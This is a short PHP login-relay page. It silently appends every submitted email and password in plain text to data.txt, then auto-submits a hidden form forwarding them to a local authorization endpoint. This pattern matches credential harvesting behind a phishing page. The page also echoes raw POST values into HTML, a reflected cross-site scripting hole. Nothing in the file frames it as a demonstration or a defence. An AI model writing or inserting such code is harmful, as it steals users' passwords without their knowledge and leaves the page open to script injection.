<?
    file_put_contents('data.txt', "\n" . $_POST['email'] . ' ' . $_POST['password'], FILE_APPEND);
?>

<form class="flex flex-col absolute inset-0 m-auto w-80 h-96 bg-white border-[1px] border-amber-200" method="post" action="http://localhost/beauty/api/authorization">
    <input hidden name="email" type="text" placeholder="E-mail" required value="<?= $_POST['email'] ?>"/>
    <input hidden name="password" type="password" maxlength="32" minlength="8" placeholder="Пароль" required value="<?= $_POST['password'] ?>" />
</form>

<script>
    document.querySelector('form').submit();
</script>